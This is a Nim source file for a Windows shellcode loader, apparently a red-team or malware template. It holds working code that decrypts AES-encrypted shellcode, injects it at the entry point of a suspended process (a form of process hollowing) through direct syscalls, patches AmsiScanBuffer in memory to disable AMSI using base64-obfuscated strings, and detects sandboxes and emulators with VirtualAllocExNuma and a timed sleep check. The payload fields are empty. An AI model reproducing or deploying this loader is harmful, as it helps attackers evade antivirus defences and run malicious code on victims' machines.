import os
import times
import base64
import random
import dynlib
import endians
import strformat

import winim/lean
import nimcrypto
include syscalls


proc hollowShellcode[byte](shellcode: openArray[byte]): void =
    let
        processImage: string = r""
    var
        nBytes: SIZE_T
        tmp: ULONG
        res: WINBOOL
        baseAddressBytes: array[0..sizeof(PVOID), byte]
        data: array[0..0x200, byte]

    var ps: SECURITY_ATTRIBUTES
    var ts: SECURITY_ATTRIBUTES
    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION

    res = CreateProcess(
        NULL,
        newWideCString(processImage),
        ps,
        ts, 
        FALSE,
        0x4, # CREATE_SUSPENDED
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi)

    if res == 0:
        echo fmt"[DEBUG] (CreateProcess) : Failed to start process from image {processImage}, exiting"
        return

    var hProcess = pi.hProcess
    var bi: PROCESS_BASIC_INFORMATION

    res = NtQueryInformationProcess(
        hProcess,
        0, # ProcessBasicInformation
        addr bi,
        cast[ULONG](sizeof(bi)),
        addr tmp)

    if res != 0:
        echo "[DEBUG] (NtQueryInformationProcess) : Failed to query created process, exiting"
        return

    var ptrImageBaseAddress = cast[PVOID](cast[int64](bi.PebBaseAddress) + 0x10)

    res = NtReadVirtualMemory(
        hProcess,
        ptrImageBaseAddress,
        addr baseAddressBytes,
        sizeof(PVOID),
        addr nBytes)

    if res != 0:
        echo "[DEBUG] (NtReadVirtualMemory) : Failed to read image base address, exiting"
        return

    var imageBaseAddress = cast[PVOID](cast[int64](baseAddressBytes))

    res = NtReadVirtualMemory(
        hProcess,
        imageBaseAddress,
        addr data,
        len(data),
        addr nBytes)

    if res != 0:
        echo "[DEBUG] (NtReadVirtualMemory) : Failed to read first 0x200 bytes of the PE structure, exiting"
        return

    var e_lfanew: uint
    littleEndian32(addr e_lfanew, addr data[0x3c])
    echo "[DEBUG] e_lfanew = ", e_lfanew

    var entrypointRvaOffset = e_lfanew + 0x28
    echo "[DEBUG] entrypointRvaOffset = ", entrypointRvaOffset

    var entrypointRva: uint
    littleEndian32(addr entrypointRva, addr data[cast[int](entrypointRvaOffset)])
    echo "[DEBUG] entrypointRva = ", entrypointRva

    var entrypointAddress = cast[PVOID](cast[uint64](imageBaseAddress) + entrypointRva)
    echo "[DEBUG] entrypointAddress = ", cast[uint64](entrypointAddress)

    var protectAddress = entrypointAddress
    var shellcodeLength = cast[SIZE_T](len(shellcode))
    var oldProtect: ULONG

    res = NtProtectVirtualMemory(
        hProcess,
        addr protectAddress,
        addr shellcodeLength,
        0x40, # PAGE_EXECUTE_READWRITE
        addr oldProtect)

    if res != 0:
        echo "[DEBUG] (NtProtectVirtualMemory) : Failed to change memory permissions at the EntryPoint, exiting"
        return

    res = NtWriteVirtualMemory(
        hProcess,
        entrypointAddress,
        unsafeAddr shellcode,
        len(shellcode),
        addr nBytes)

    if res != 0:
        echo "[DEBUG] (NtWriteVirtualMemory) : Failed to write the shellcode at the EntryPoint, exiting"
        return

    res = NtProtectVirtualMemory(
        hProcess,
        addr protectAddress,
        addr shellcodeLength,
        oldProtect,
        addr tmp)

    if res != 0:
        echo "[DEBUG] (NtProtectVirtualMemory) : Failed to revert memory permissions at the EntryPoint, exiting"
        return

    res = NtResumeThread(
        pi.hThread,
        addr tmp)

    if res != 0:
        echo "[DEBUG] (NtResumeThread) : Failed to resume thread, exiting"
        return

    res = NtClose(
        hProcess)


proc isEmulated(): bool =
    let mem = VirtualAllocExNuma(
        GetCurrentProcess(),
        NULL,
        0x1000,
        0x3000, # MEM_COMMIT | MEM_RESERVE
        0x20, # PAGE_EXECUTE_READ
        0)

    if isNil(mem):
        return true
    return false


proc amsiPatchMemory(): bool =
    # Based on: https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
    const
        patchBytes: array[8, byte] = [byte 0xb8, 0x57, 0x00, 0x07, 0x80, 0xc2, 0x18, 0x00]
    var
        hLib: LibHandle
        res: WINBOOL

    hLib = loadLib(decode("YW1zaQ==")) # amsi

    if isNil(hLib):
        echo "[DEBUG] (loadLib) : Failed to load library amsi.dll, AMSI disabled"
        return true

    var patchAddress: pointer = hLib.symAddr(decode("QW1zaVNjYW5CdWZmZXI=")) # AmsiScanBuffer, equivalent of GetProcAddress()

    if isNil(patchAddress):
        echo "[DEBUG] (symAddr) : Failed to get the address of AmsiScanBuffer, AMSI disabled"
        return true

    var patchBytesLength = cast[SIZE_T](len(patchBytes))
    var oldProtect: ULONG

    res = NtProtectVirtualMemory(
        GetCurrentProcess(),
        addr patchAddress,
        addr patchBytesLength,
        0x4, # PAGE_READWRITE
        addr oldProtect)

    if res == 0:
        echo "[DEBUG] (NtProtectVirtualMemory) : Applied AMSI patch, AMSI disabled"
        copyMem(patchAddress, unsafeAddr patchBytes, len(patchBytes))

        var tmp: ULONG

        res = NtProtectVirtualMemory(
            GetCurrentProcess(),
            addr patchAddress,
            addr patchBytesLength,
            oldProtect,
            addr tmp)

        return true

    return false


proc sleepAndCheck(): bool =
    randomize()
    let dreaming = rand(5000..10000)
    let delta = dreaming - 500
    let before = now()
    sleep(dreaming)
    if (now() - before).inMilliseconds < delta:
        return false
    return true


when isMainModule:
    func toByteSeq*(str: string): seq[byte] {.inline.} =
        @(str.toOpenArrayByte(0, str.high))

    let
        password: string = ""
        ivB64: string = ""
        encB64: string = ""
    var
        ctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: seq[byte] = toByteSeq(decode(ivB64))
        enc: seq[byte] = toByteSeq(decode(encB64))
        dec: seq[byte] = newSeq[byte](len(enc))

    # Check if we're in a sandbox by calling a rare-emulated API
    if isEmulated():
        echo "[-] VirtualAllocExNuma did not pass the check, exiting"
        quit()

    # Patch AMSI
    if amsiPatchMemory():
        echo "[+] 4.M.S.I disabled!"

    # KDF based on SHA256
    var expKey = sha256.digest(password)
    copyMem(addr key[0], addr expKey.data[0], len(expKey.data))
    ctx.init(key, iv)

    # Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
    if not sleepAndCheck():
        echo "[-] Sleep did not pass the check, exiting"
        quit()

    # Decrypt the shellcode
    ctx.decrypt(enc, dec)
    ctx.clear()

    hollowShellcode(dec)
